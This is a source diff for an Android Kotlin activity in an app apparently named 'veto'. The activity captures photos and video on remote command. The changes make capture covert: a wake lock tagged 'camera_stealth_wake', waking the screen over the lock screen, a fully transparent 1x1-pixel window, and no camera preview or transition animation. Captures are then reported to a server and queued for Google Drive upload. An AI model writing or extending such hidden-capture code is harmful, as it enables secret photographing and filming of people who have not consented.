@@ -1,6 +1,7 @@
 package com.neubofy.veto.ui
 
 import android.Manifest
+import android.content.Context
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
@@ -43,6 +44,7 @@ class DummyCameraxActivity : AppCompatActivity() {
     private var cameraExtra: Int = CAMERA_BACK
     private var shouldFlash: Boolean = false
     private var hasStarted = false
+    private var wakeLock: android.os.PowerManager.WakeLock? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -51,18 +53,43 @@ class DummyCameraxActivity : AppCompatActivity() {
             finish()
             return
         }
+
+        // Acquire WakeLock to keep CPU active during screen-off capture
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+            @Suppress("DEPRECATION")
+            wakeLock = pm.newWakeLock(
+                android.os.PowerManager.PARTIAL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
+                "veto:camera_stealth_wake"
+            ).apply { acquire(45000L) }
+        } catch (e: Exception) {
+            this.log().w(TAG, "Failed to acquire WakeLock: ${e.message}")
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+            setShowWhenLocked(true)
+            setTurnScreenOn(true)
+        }
+
         viewBinding = ActivityDummyCameraxBinding.inflate(layoutInflater)
         setContentView(viewBinding.root)
 
-        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O) {
-            @Suppress("Deprecation")
-            window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
-        }
+        window.attributes.alpha = 0f
+        window.setDimAmount(0f)
+        window.setGravity(android.view.Gravity.TOP or android.view.Gravity.START)
+        window.setLayout(1, 1)
 
-        window.setFlags(
-            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
-            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+        @Suppress("DEPRECATION")
+        window.addFlags(
+            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
+            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
+            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
         )
+        @Suppress("DEPRECATION")
+        overridePendingTransition(0, 0)
 
         onBackPressedDispatcher.addCallback(this, object : androidx.activity.OnBackPressedCallback(true) {
             override fun handleOnBackPressed() {
@@ -81,7 +108,7 @@ class DummyCameraxActivity : AppCompatActivity() {
         shouldFlash = intent.extras?.getBoolean(EXTRA_FLASH) ?: false
 
         lifecycleScope.launch {
-            val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "camera"
+            val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "photo"
             // Ensure any overall hardware lockup times out after a hard limit
             val result = withTimeoutOrNull(45000L) {
                 com.neubofy.veto.utils.CommandQueueManager.runMediaCommandInQueue {
@@ -103,12 +130,20 @@ class DummyCameraxActivity : AppCompatActivity() {
 
     override fun onNewIntent(intent: android.content.Intent) {
         super.onNewIntent(intent)
-        setIntent(intent)
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        cameraExecutor.shutdown()
+        try {
+            if (!cameraExecutor.isShutdown) {
+                cameraExecutor.shutdown()
+            }
+        } catch (_: Exception) {}
+        try {
+            if (wakeLock?.isHeld == true) {
+                wakeLock?.release()
+            }
+        } catch (_: Exception) {}
     }
 
     private fun hasCameraPermission(): Boolean {
@@ -118,7 +153,7 @@ class DummyCameraxActivity : AppCompatActivity() {
     }
 
     private suspend fun takePhoto() {
-        val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "camera"
+        val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "photo"
         val ctx = applicationContext
 
         val flashMode = if (shouldFlash && cameraExtra == CAMERA_BACK) {
@@ -157,9 +192,7 @@ class DummyCameraxActivity : AppCompatActivity() {
 
         cameraProvider.unbindAll()
         try {
-            // Bind Dummy Preview alongside ImageCapture to satisfy hardware camera HAL requirements
-            val preview = Preview.Builder().build()
-            cameraProvider.bindToLifecycle(this, cameraSelector, preview, imageCapture)
+            cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture)
         } catch (e: Exception) {
             this.log().e(TAG, "Cannot take picture: bindToLifecycle failed. ${e.message}")
             val transport = NextJsServerTransport(ctx)
@@ -168,8 +201,8 @@ class DummyCameraxActivity : AppCompatActivity() {
             return
         }
 
-        // Suspend with 10-second strict timeout for image capture callback
-        val imgBytes = withTimeoutOrNull(10000L) {
+        // Suspend with 5-second strict timeout for image capture callback
+        val imgBytes = withTimeoutOrNull(5000L) {
             suspendCancellableCoroutine<ByteArray?> { cont ->
                 imageCapture.takePicture(
                     cameraExecutor,
@@ -209,28 +242,30 @@ class DummyCameraxActivity : AppCompatActivity() {
         }
     }
 
-    private suspend fun savePhotoAndFinish(imgBytes: ByteArray, commandName: String) {
+    private fun savePhotoAndFinish(imgBytes: ByteArray, commandName: String) {
         val ctx = applicationContext
         val photosDir = MediaStorageManager.getPhotosDir(ctx)
         val photoFile = File(photosDir, "photo_${System.currentTimeMillis()}.jpg")
 
-        withContext(Dispatchers.IO) {
+        try {
             photoFile.writeBytes(imgBytes)
+        } catch (e: Exception) {
+            ctx.log().e(TAG, "Error writing photo file: ${e.message}")
         }
 
-        // Send Step 2 status message
-        val transport = NextJsServerTransport(ctx)
-        transport.send(
-            ctx,
-            "Photo captured successfully! Saved locally to ${photoFile.name}. Queued for Google Drive upload...",
-            commandName
-        )
-
-        // Close activity immediately so camera hardware is freed
+        // Close activity IMMEDIATELY so camera hardware is freed
         finish()
 
-        // Trigger smart syncer for recent files (< 1 min)
-        MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = commandName)
+        // Offload status notification and Google Drive upload to background scope
+        lifecycleScope.launch(Dispatchers.IO) {
+            val transport = NextJsServerTransport(ctx)
+            transport.send(
+                ctx,
+                "Photo captured successfully! Saved locally to ${photoFile.name}. Queued for Google Drive upload...",
+                commandName
+            )
+            MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = commandName)
+        }
     }
 
     private suspend fun recordVideo() {
@@ -243,7 +278,7 @@ class DummyCameraxActivity : AppCompatActivity() {
             androidx.camera.video.FallbackStrategy.lowerQualityOrHigherThan(androidx.camera.video.Quality.SD)
         )
         val recorder = androidx.camera.video.Recorder.Builder()
-            .setExecutor(cameraExecutor)
+            .setExecutor(ContextCompat.getMainExecutor(this))
             .setQualitySelector(qualitySelector)
             .build()
         val videoCapture = androidx.camera.video.VideoCapture.withOutput(recorder)
@@ -253,9 +288,7 @@ class DummyCameraxActivity : AppCompatActivity() {
 
         cameraProvider.unbindAll()
         try {
-            val preview = Preview.Builder().build()
-            cameraProvider.bindToLifecycle(this, cameraSelector, preview, videoCapture)
-            kotlinx.coroutines.delay(1000L)
+            cameraProvider.bindToLifecycle(this, cameraSelector, videoCapture)
         } catch (e: Exception) {
             this.log().e(TAG, "Cannot record video: bindToLifecycle failed. ${e.message}")
             val transport = NextJsServerTransport(ctx)
